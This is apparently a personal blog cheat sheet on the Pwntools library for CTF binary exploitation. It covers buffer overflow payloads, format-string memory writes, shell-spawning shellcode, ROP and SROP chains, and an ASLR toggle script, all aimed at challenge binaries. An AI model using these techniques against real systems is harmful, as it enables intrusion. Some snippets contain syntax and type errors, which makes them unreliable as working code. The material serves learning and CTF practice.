---
layout: post
title: Pwntools Tricks and Examples
date: 2024-09-12 16:12 -0400
categories: [Python]
tags: [cheat sheet, python, hacking, binary exploitation]
---

Pwntools is a set of utilities and helpful shortcuts for exploiting vulnerable binaries, but it has its merits for additional tools and utilities too. Things like easily packing and unpacking data without having to import the `struct` library, sending arbitrary data through a data "tube" which could be directly interacting with a local binary to communicating with a remote binary over ssh. You can even interact fairly easily over a net socket without having to deal with all the overhead of doing it manually. In fact, that's a majority of pwntools: utilities that get rid of allllll the overhead.

I'm not an expert, but learning as much as I can, and the only way I really can learn it is by playing with CTF challenges and the like. Now the scope of this document will be [Pwntools](https://github.com/Gallopsled/pwntools) only, not binary exploitation per se. One day I may write something about that, but honestly I'm still learning. As of this writing, I _get_ it, I just don't _get_ it. Not completely anyway. The basic concepts make sense to me, but all of the "well obviously in this case you'd do such-and-such" instinctive perceptions one would get from being old hat at this haven't quite made their way into my noodle yet.

Now, more to the point here, Pwntools is a fantastic set of tools in python that are specifically designed to assist in exploit development. Learning how to exploit a binary _without_ pwntools is probably the best way of learning it, but pwntools just makes all the tedious tasks that much easier to accomplish. So full disclaimer: if you don't know the concept of how pwntools can do something, then you really should attempt to learn it without pwntools because otherwise it just seems like magic.

Anyway, yes. Pwntools. A library of cutting-through-the-BS. What I don't know about it can fill a book. But what I _do_ know can fit on this webpage, so I'm just going to make a little cheat sheet of things you can do in Pwntools and techniques I've discovered. I'm writing it down here and updating as I go so it doesn't get lost in my pages and pages of Onenote documents. Plus it helps me learn if I write about it as if I know it inside and out. Here we go.

## The Template

Pwntools comes with a fancy way to create a template to work with. It's pretty useful, albeit fairly verbose. You can use the standard pwntools template by running the following command:

```terminal
$ pwn template ./local_binary > exploit.py
```

This generates a boilerplate template that sets everything up for you. Loads up the executable as a pwn.ELF (or whatever), sets up the potential to run it in `gdb`, and sets up the context of the binary such as what architecture, the endianness, etc. If you are using it to connect to a remote service you can specify it here like so:

```terminal
$ pwn template --host=pwn.example.com --port=34828 --libc=./libc.6.so --quiet ./local_binary > exploit.py
```

Now you can call the script in fancy ways, such as if you want to only connect to the local binary instead of the remote one listed by sending arguments, and then connect the output to GDB:

```terminal
$ python3 exploit.py LOCAL LOCAL_LIBC GDB
```

That `--quiet` flag is key. Without it, it will print a bunch of additional annotation which I think is fairly pointless. It's pretty great but sometimes I like to approach things with a clearer head since the template it builds for you looks quite a bit cluttered. Sure there's an area at the bottom where it explicitly states to write your code here, but this template works for me too:

```python
#!/usr/bin/env python3

from pwn import *

BINARY = './local_binary'
HOST = 'pwn.example.com'
PORT = 52143

exe = context.binary = ELF(BINARY)

rop = ROP(exe)
libc = exe.libc

# p = connect(HOST, PORT)
p = process(BINARY)

# Put exploit code here
```

That should be enough to get me started.

> Note: From this point forward, I will use the `p` variable to refer to the binary process I am exploiting.
{: .prompt-info } 

## Context

When dealing with pwntools, context truly is everything. Pwntools needs to know the endianness and architecture, as well as whether or not we're dealing with any built-in securities. Additionally, the context tells pwntools how _you_ prefer to have your local setup, which includes the ability to open and attach a `gdb` debugging window alongside your interactive window. You can specify the context you want, or you can have pwntools inspect the binary in question automatically.

### Automatically Obtain Context

The standard way I do it is with the following line:

```python
BINARY = "./vuln"
exe = context.binary = ELF(BINARY)

p = exe.process()
```
This sets up a pretty important variable, `exe`. From here you can create a new variable, in this case `p`, which you point to the process. Of course you can also create `libc = exe.libc` and get the libc object as well, if there is any.

What's important to know here is that the `exe` variable now knows how to handle packing data based on the executable's architecture. If it's 64-bit, you don't have to use `p64()`, you can just use `pack()`. It knows the endianness and can adjust accordingly.

### Manual Context

You can set attributes to apply to the context as you see fit here.

```python
# Specify one attribute with dot-notation
context.log_level = 'DEBUG'

# Specify many attributes
context(os="linux", arch="amd64", endian="little")

# Specify GDB Through Tmux vertically
context.terminal = ['tmux', 'splitw', '-v']
```

## Working With Tubes

Now obviously you can read all about how to interact with tubes in their documentation, but here's just a few things I use and the caveats I discovered.

### Receiving

How to get data from the process.

#### Receive a Line
You can receive one line at a time and call this as many times as necessary, but note that this will block if there isn't a newline or `\x00` in the receive queue, OR if you are receiving lines that aren't in the queue and it turns out the application is waiting on user input:

```python
p.recvline()
```
If you want, you can set a timeout to ensure that it doesn't block indefinitely:

```python
p.recvline(timeout=5)
```
This way, if it hits a brick wall, it will time out after 5 seconds and the rest of your code can process normally. But really if that happens you might have other problems than not dealing with the input queue properly.

You can call that as many times as newlines you are expecting, or just run `p.clean()`. This will output data as well, so if you are expecting an address in this data, you can parse it using squirrelly python ways, which I'll get into later.

#### Receive Until

If you know what the program will output, such as a prompt, you can receive data until you hit exactly that line. For instance, if the program prints out the following text:

```
Welcome to my challenge!
Please enter a number: 
```

You can receive until the `:` or even the word `number:`. This usually preceeds a sending of data.

```python
p.recvuntil(b':')
```

#### Receive N Bytes

If you're expecting a certain amount of bytes to read in, such as if you leaked an address and you know it's 8 bytes long, you can tell pwntools to only receive `N` bytes, but be careful that this will block until as many bytes are read in:

```python
p.recv(8)
```

#### Receive and Close

This just receives everything until an EOF is discovered, then shuts it all down afterwards. Good to use as the last command to ensure the binary spits out what it has and then closes the connection. This will block until EOF is reached though, so this is kind of a method of getting all data regardless.

```python
p.recvall()
```

#### Receive and Clear the Queue

This won't sever the connection, but instead clears out all data queued up to receive by and puts you current in the execution process.

```python
p.clean()
```

### Sending

There really isn't much to sending data. You can send data, or send data followed by a newline.

#### Arbitrary Send

Send whatever data you want to the process.

```python
p.send(b"Just make sure it's a byte string!")
```

#### Send with Newline

This is a matter of convenience. Makes sure a newline follows the data. Useful for sending raw input to a process that is expecting you to hit enter once you send it something.

```python
p.sendline(b"Again, make sure it's a byte string!")
```
Of course, there are quite a few ways to send data with all sorts of weird functions such as `sendlinethen()`, which is a combination of `sendline()` followed by `recvuntil()`. In fact:

#### Send Line and Then...

You can send a line and then wait for a delimiter to shave off a couple lines of code:

```python
p.sendlinethen(b':', payload)
```
The above will send the contents of the `payload` variable, then wait until it hits a `:`.

## Extracting Data from Output

Sometimes you need to formulate the output of data that you received into something you can work with, like an address for example. Take this example, something from a picoCTF challenge:

```c
// snip...
void setup() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
        puts("Howdy gamers!");
        printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}
// snip...
```

This will print out the memory location of the `setvbuf()` function in libc. Or rather, the address in the GOT (Global Offset Table). This is some pretty useful information to have! We'll peel that off of STDOUT and convert that hex address into a number we can use in python.

```python
p.recvuntil(b':')
string_addr = p.recvline()

# Our variable should contain ' 0xAAAABBBB\n', 
# only an actual number. Strip off the
# remaining cruft
string_addr = string_addr.strip()

# Now convert it to a hexidecimal number, it
# doesn't matter if it starts with an '0x',
# the int() function will know what we're
# looking at since we're specifying base-16.
vbuf_addr = int(string_addr, 16)
```

## Alignment

Sometimes the data you are sending is less than expected for packing and unpacking. This doesn't work too well in terms of alignment, especially if each item on the stack is 8 bytes and your payload is only 4. The first thing that comes to mind here is in the event that you have a format string exploit point and you want to leak the absolute address in the GOT. In this case, you can always left-justify your payload with the `.ljust()` string/bytestring function and pack the rest with null bytes.

```python
payload = (b'%%%d$s' % i + b'AAAA') + p64(absolute_address_of_GOT_entry)
p.sendline(payload)
addr = p.recvline().split(b'AAAA')[0].ljust(8, b'\x00')
```

## Logging

Pwntools comes with a handy way to log things. It's just a nice way to display what you've found, but you can also do some nifty python trickery since throwing an error will throw a Pwntools exception.

```python
info("Here's some information")
# [*] Here's some information

warn("Uh oh, here's something to watch out for.")
# [!] Uh oh, here's something to watch out for.

debug("This won't show up unless your logging context is set to debug")
# [DEBUG] This won't show up unless your logging context is set to debug

error("Something went horribly wrong! Stop processing!")
# Throws a PwnlibException
```

### Log to a log file

You can set the context to log everything to a log file, if that's your thing.

```python
context.log_file = "output.log"
```

### Progress ticker

As of this writing I don't believe any functionality has been written for an arbitrary progress throbber, but until then this works just as well:

```python
with log.progress("Doing stuff") as p:
    for i in range(10):
        # Do stuff...
        p.status("currently doing xyz...")
        if abc = true:
            p.success("Finished doing xyz successfully.")
        elif xyz < 100:
            p.failure("Couldn't do it!")
    
    p.failure("Timeout")
```

### Stifling Logging

Sometimes it is worthwhile to stifle logging. Pwntools will log to `info` level logging by default, which means whenever an ELF file is loaded it will dump all the security features the file has, which can be problematic if you're opening it up and closing it down over and over again. To handle that, I set the default log level to `warn` and only log that level for things I care about.

```python
exe = context.binary = ELF("./vuln")
context.log_level = 'warn'

# Note: This checks for stack stability, ensuring the 20th value on the
# stack is the same value if I start up the program 20 times in a row

for i in range(10):
    p = exe.process()
    payload = (b'%20$p')
    p.sendline(payload)
    val = p.recvline()
    warn(f"Iter {i}, Result: {val}")
```

## Packing and Unpacking

When you're sending data to be injected directly onto the stack (or elsewhere), you have to make sure the number you put in is the proper endianness of the target binary. This is a pretty useful utility because it's always easier than doing it yourself.

### Packing

To pack a binary in various architectures:

```python
my8bitval = p8(0xff)
my16bitval = p16(0xbabe)
my32bitval = p32(0xdeadbeef)
my64bitval = p64(0xdeadcafebeefbabe)
```

But it will also just pay attention to whatever context you set the application to.

```python
context.update(
    arch="amd64",
    bits=64,
    endian="little"
)

myval = pack(0xdeadcafebeefbabe)
# b'\xbe\xba\xef\xbe\xfe\xca\xad\xde'
```

### Unpacking

If you want to do the opposite, such as if you are reading directly off of memory and its endianness is annoying to work with, you can unpack it similar to the above. If you don't want to play a guessing game, just set the context ahead of time.

```python
context.update(
    arch="amd64",
    bits=64,
    endian="little"
)

myPackedVal = b'\xbe\xba\xef\xbe\xfe\xca\xad\xde'
myUnPackedVal = unpack(myPackedVal)
# 16045704242864831166
# or...
hex(myUnPackedVal)
# 0xdeadcafebeefbabe
```

## Overflowing

First thing's first, you need to find an overflow point. This is just standard in the binary exploitation process, look for any user input field, whether it's through an argument, an environment variable, or through STDIN, and attempt to send it more data than it expects. If it segfaults, it can most likely be overflowed. Once you find that point, you need to find the offset of exactly where it flows into a known register you'd like to control. 

> If it's i386, you generally want to find out the offset to overflow the `EIP` (Enhanced Instruction Pointer) register. If it's x86_64, you want to find out what overflows into the `RSP`, which is the Stack Pointer register.
{: .prompt-info }

Once you determine the overflow point, you can use pwntools to create a [De Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) using the command line to generate one.

```terminal
$ pwn cyclic 150
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaas...
```

Truncated the above for aesthetics. The `150` is the generated length, you want something large enough to overflow whatever buffer you're testing. If you don't add the length, it will dump every single 8-byte combination, which will be tremendous.

After reviewing what register the pattern overflows to (depending on your architecture), you can copy the pattern in that register (or wherever) into the following command:

```terminal
$ pwn cyclic -l jaaakaaa
36
```

In the above, I used the offset discovered in `RSP` (in this case, `jaaakaaa`) to determine that the offset is `36` characters. I can use this value to overflow and insert whatever address I'd want.

### Creating the Overflow Payload

Assuming the above example with an offset of `36`, I can go about this in two ways. To build this however, let's assume that the code below leads up to the overflow point.

```python

OFFSET = 36

payload = b'A'*OFFSET
payload += p64(0xdeadbeef)
p.sendline(payload)
```

...or, I can use the pwntools `flat()` function to do the exact same thing.

```python

OFFSET = 36

payload = flat({OFFSET: 0xdeadbeef})
p.sendline(payload)
```
> Note: No need to pack the payload in the `flat()` function, pwntools will figure out the endianness for you based on the context you've specified at the beginning of the code!
{: .prompt-info }

And I can do you one better, if you know the offset pattern, you don't even need to add the offset number.

```python

payload = flat({'jaaakaaa': 0xdeadbeef})
p.sendline(payload)
```

You can even do more than one, just know that the offset number is the number from the first entrypoint, not "since the last offset."

```python

payload = flat({
    'jaaakaaa': 0xdeadbeef,
    95        : 0xdeadc0de
})
p.sendline(payload)
```

The `flat()` function takes a dictionary of items, where the key of each item is expected to be an integer to pad data with, followed by a value to place after the padded data. You can add as many values as you like here, it will be dealt with in order.

## Format String Exploitation

In the event that you have a format string vulnerability, there are basically two major things you can do with this. First, you can dump values off of the stack and potentially dereference pointers and leak values, and second you can also write to an arbitrary place in memory. So let's discuss both.

### Find the Format String Offset

First thing is first, we should find the offset of the exploit. To briefly talk about what a format string vulnerability is, it is when someone accidentally allows a user to control the value being printed explictly through a `printf()` or `sprintf()` function. So:

Good usage:
```c
char name[] = "Agr0";

printf("Hello, my name is %s.\n", *name);
```

Bad usage:
```c
printf(user_input)
```

Because the variable `user_input` is assumed that we control it, we can pass in format string modifiers into the string and read values off the stack. Since `printf()` expects arguments to be taken from the stack it happily allows you to arbitrarily read items using things like:

```text
%p - Value off the stack.
%x - Hexidecimal value off the stack.
%d - Digit off the stack.
%c - Character off the stack.
%s - String from a pointer off the stack.
```

And you can look at specific arguments by using the following syntax:

```text
%5$p - Read the 5th address off the stack.
%10$s - Dereference the 10th address off the stack and print as a string. This can be useful!
```

Then of course there is the `%n` modifier, which allows you to write data into any place in memory that is writable. Getting into exactly how this works is outside of the scope of this document since this is just a pwntools cheatsheet, but in order to write data to places in memory, this is the modifier that does it. And yes, I firmly believe this modifier was created with the sole purpose of being exploitable because I can't find any reason to use it.

### Determining the Offset

You can do this manually by adding a bunch of `%p.%p.%p.%p....` and counting the output until you see `0x25702e25.0x70232570.`, since that is the hex representation of the string we entered, but it's just cooler to find the offset automatically using pwntools.

First, you need to set up a function whose sole purpose is to send whatever it's given as an argument as the payload to the format string attack and return the result.

```python
def fmt_exploit(payload):
    p = process("./vuln")
    p.recvline()
    p.sendline(payload)
    return p.recvall()
```

Note that the above function should match whatever application you're using, don't just copy this verbatim. This is meant as an example, so make sure this function does exactly what I said above.

Now we can tell pwntools to find the offset with just one line of code.

```python
format_string = FmtStr(execute_fmt=fmt_exploit)
```

This takes the function as an argument and attacks it over and over again until it can read it's own value in the returned data, determining the offset automatically.

```python
format_string.offset # This will be the offset value.
```

### Overwriting Values

With the `fmtstr_payload()` function, we can generate a payload that will write any arbitrary data into any arbitrary address. We can do this multiple times, too. It takes in a dict value with a `{from_addr: to_addr}` syntax:

```python
from_addr = 0xdeadbeef # The address I want to write to
to_addr = 0xcafebabe   # The data I want to put there

payload = fmtstr_payload(format_string.offset: {from_addr: to_addr})

p.sendline(payload)
```

## Shellcode

Generally speaking, most of the time I'm going to pull shellcode off of [Shell-Storm](https://shell-storm.org) or [Exploit-DB](https://exploit-db.com) if I ever have a place where I can execute it, such as if NX/DEP is not enabled (in which case I can stuff it onto the stack), or if I can somehow run an `mprotect()` syscall and define a place in memory that I can put it, but the neato thing about pwntools is that if you want to run a specific task that you'd want the binary you're exploiting to perform, you can craft (and chain!) your own shellcode using the `shellcraft` module. This is neat if you have the space and flexibility, but if you're looking for shellcode of a specific size then it might be worthwhile to start digging around Shell-Storm or Exploit-DB rather than use the built-in "execute-and-drop-to-a-shell" function as found in pwntools.

Still though, if you're still into making your own shellcode, the shellcraft module can certainly help you out.

> Make sure your context is set to the proper architecture or else this could error out!
{: .prompt-warning }

One such payload comes to mind when I had to set the `setreuid()` function to a specific user before I execute a shell, otherwise I will be the current user, and not the SUID'd user.

```python
shellcode = shellcraft.amd64.linux.setreuid(10003)
shellcode += shellcraft.amd64.linux.sh()
```

Now one thing to note is that if you print out the `shellcode` variable, it will print the human-readable assembly code. To send this as a payload, you have to wrap it in the `asm()` function.

```python
p.sendline(
    flat({
        36: asm(shellcode),
        36+len(asm(shellcode)): 0xdecafbad
    })
)
```
Flexing a little bit on the calculations there. But this will add a packed `0xdecafbad` to the end of the shellcode. Note that I don't need to explicitly pack this value, `flat()` will handle the endianness for me based on the context of the binary.

### Straight Up Assembly

Of course you can just type up raw assembly and pwntools will happily convert it to raw bytecode. Ordinarily [Defuse's online assembler/disassembler](https://defuse.ca/online-x86-assembler.htm) has always been my goto, but this is pretty neat regardless.

With the `asm()` function, you can just convert any old assembly code with ease:

```python
random_shellcode = asm("""
dec rax
xor rdi, rdi
push rsp
syscall
""")

# b'H\xff\xc8H1\xffT\x0f\x05'
```

> Note: the above is nonsensical and won't actually do anything. Just random instructions.
{: .prompt-info }

## ROP Chains

If you give pwntools a good review from their documentation, you'd be surprised at exactly what you can do with their built-in ROP chain handler. But before I go on, I'd like to go over some of the basics when it comes to using ROP gadgets. The "manual" way is to run the binary through an external application like `ropper` or `ROPGadget` to dump a list of gadgets we can use. It will list a bunch of rudimentary functions that all end in a `ret` command, which allows you to return back to where you called the gadget entirely. _However_ it's important to know that a gadget found using any of these applications will print out the _offset_ of the binary where that gadget is located. That means that if you actually want to use the gadget you'll need the absolute address, so that means you'll need to somehow leak the location of the base of the code beforehand and simply add the offset of the gadget to it to access it directly.

Finding the base of the `.text` section (or PIE base) is outside the scope of this document, but the super-abridged version is if you can find a way to leak the address of an object such as a symbol or variable or whatever, you can determine the offset of that object using something like [Ghidra](https://ghidra-sre.org) or something, and simply subtract it from the code base to get your PIE base.

The point here though is that you will have to add the discovered code base location to the offset of each discovered ROP gadget to access that gadget in memory. Unless of course you tell pwntools where the address is!


```python
exe = context.binary = ELF("./vuln")

# Let's say somehow we leaked an address, discovered the
# address of the base of the code as 0xff000000
exe.address = 0xff000000

# Now that we've done that, the ROP gadgets we can use will
# automatically add the offset to the exe.location value,
# giving the exact location of the gadget. Nice for readability.

# Now set up the rop object using the executable we defined.
rop = ROP(exe)
```

### How ROP works manually

As an example, I will try to use a very simple ROP gadget that prints out the location of the `puts` function in the GOT. To do that, we need to use a `pop rdi; ret` gadget to move the address in the GOT into the `rdi` register before we call the `puts@PLC` function. Manually, it would look something like this:

```python
pop_rdi = 0x10c
puts_plc = 0x7f0014df
puts_got = 0x7f0059cd

leaked_base = 0x55df3000

payload = b'A'*50                       # padding
payload += pack(leaked_base + pop_rdi)  # pop_rdi gadget
payload += pack(puts_got)               # address in the got
payload += pack(puts_plc)               # execute puts

p.send(payload)
```

### How to ROP like you own the place

The above addresses are all made up but you get the idea. You have to research all the address locations and set them as variables. This is fine of course, but the above can be done in pwntools very easily. To accomplish the same thing as the above, this code is functionally equivalent:

```python
exe = context.binary = ELF('./vuln')

# ... leak the address somehow...
exe.address = 0x55df3000

# build the ROP object
rop = ROP(exe)
rop.puts(exe.got.puts)
p.send(flat({50: rop}))
```

Pwntools will set up the gadgets to put the `puts` address in the GOT into the `rdi` register, then call the function from the PLC, all while packing the data appropriately. From there it should print out the address for you to ingest. And if you had a more complicated rop chain that you needed to add, you can just keep adding more commands like `rop.printf(exe.got.printf)` or whatever. Each new command will append to the rop chain for you to send off.

### Other gadgets

You can get a list of the rop gadgets you can use:

```python
rop.gadgets
"""
{4900: Gadget(0x1324, ['add esp, 0x38', 'pop rbx', 'pop rbp', 'ret'], [56, 'rbx', 'rbp'], 0x50),
 4952: Gadget(0x1358, ['add esp, 0x48', 'ret'], [72], 0x50),
 4119: Gadget(0x1017, ['add esp, 8', 'ret'], [8], 0x10),
 4899: Gadget(0x1323, ['add rsp, 0x38', 'pop rbx', 'pop rbp', 'ret'], [56, 'rbx', 'rbp'], 0x50),
 4951: Gadget(0x1357, ['add rsp, 0x48', 'ret'], [72], 0x50),
 4118: Gadget(0x1016, ['add rsp, 8', 'ret'], [8], 0x10),
 5052: Gadget(0x13bc, ['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['r12', 'r13', 'r14', 'r15'], 0x28),
 5054: Gadget(0x13be, ['pop r13', 'pop r14', 'pop r15', 'ret'], ['r13', 'r14', 'r15'], 0x20),
 5056: Gadget(0x13c0, ['pop r14', 'pop r15', 'ret'], ['r14', 'r15'], 0x18),
 5058: Gadget(0x13c2, ['pop r15', 'ret'], ['r15'], 0x10),
 5051: Gadget(0x13bb, ['pop rbp', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r12', 'r13', 'r14', 'r15'], 0x30),
 5055: Gadget(0x13bf, ['pop rbp', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r14', 'r15'], 0x20),
 4370: Gadget(0x1112, ['pop rbp', 'ret'], ['rbp'], 0x10),
 4369: Gadget(0x1111, ['pop rbx', 'pop rbp', 'ret'], ['rbx', 'rbp'], 0x18),
 5059: Gadget(0x13c3, ['pop rdi', 'ret'], ['rdi'], 0x10),
 5057: Gadget(0x13c1, ['pop rsi', 'pop r15', 'ret'], ['rsi', 'r15'], 0x18),
 5053: Gadget(0x13bd, ['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rsp', 'r13', 'r14', 'r15'], 0x28),
 4122: Gadget(0x101a, ['ret'], [], 0x8)}
"""
```

You can see everything it has found. But understand that this is usually significantly smaller than what other tools like `ropper` or `ROPGadget` can find! Sometimes you need to reference one of those tools to find a gadget that suits your needs. But if we do have that gadget, we can easily add this to the rop chain as before by issuing a `rop.raw()` function.

```python
exe = context.binary = ELF('./vuln')

# ... leak the address somehow...
exe.address = 0x55df3000

# build the ROP object
rop = ROP(exe)

# Discovered weird rop gadget that pwntools filtered out
sub_rsp = 0x10ca      # sub rsp 0x28, ret

# Now add the discovered address to the ropchain. Don't
# forget to add it to the base address, pwntools won't
# add it with the raw() function. Though it will pack
# the data appropriately!
rop.raw(exe.address + sub_rsp)
```

As I learn more, I'll add to this section. I feel like I'm only scratching the surface with the `rop` module in pwntools.

### SROP (Signal Return-Oriented Programming)

Without getting too far into it, the basic here is that if you have the ability to execute a `syscall` arbitrarily _and_ you don't have access to that many rop gadgets, you can always perform a `Sigreturn` syscall, which is a special call that will clean up after a signal handler has completed its execution. Basically this means that some process has essentially saved the state of the registers by pushing all of them onto the stack, and when whatever has happened has finished, it pops everything back off the stack in a very specific order into the registers as a means of handling that interrupt. If you can execute an arbitrary syscall, you can build a Sigreturn object in pwntools which will set up all the registers to whatever state you want. It's pretty handy in some of those tight situations.

For this example, I'm going to execute an `mprotect()` syscall, which will set any section of memory I specify to RWX, so I can push shellcode there. Basically, build a Sigreturn frame like so:

```python
SYSCALL_RET = 0xcafebabe
frame = SigreturnFrame(kernel='amd64')

frame.rax = constants.SYS_mprotect # mprotect() syscall value should be 0xa
frame.rdi = 0x400000               # memory to adjust
frame.rsi = 0x4000                 # size of memory to make executable
frame.rdx = 0x7                    # mode rwx
frame.rsp = 0xbaddcafe             # Wherever we want the stack pointer to be
frame.rip = SYSCALL_RET            # the syscall gadget to run this whole thing
```

Now the RIP should point to the currently-executing action, which in this case is the `SYSCALL_RET` value. We can push this whole thing onto the stack:

```python
payload = SYSCALL_RET
payload += bytes(frame)

p.sendline(payload)
```

## ASLR Toggle Script

This isn't related to pwntools at all, but sometimes I want to have a script that disables and re-enables ASLR on a whim. So I made this.

```bash
#!/bin/bash

ASLR="/proc/sys/kernel/randomize_va_space"

if [[ $(cat $ASLR) == 0 ]];
then
    echo "ASLR is turned off. Turning on now..."
    echo 2 | sudo tee $ASLR
    echo "done."
else
    echo "ASLR is turned on. Turning off now..."
    echo 0 | sudo tee $ASLR
    echo "done."
fi
```
Just handy to have in your back pocket.

## Conclusion

This is about all I can muster. Just like every other article and cheat sheet I've ever written, I hope to update this as I learn new things.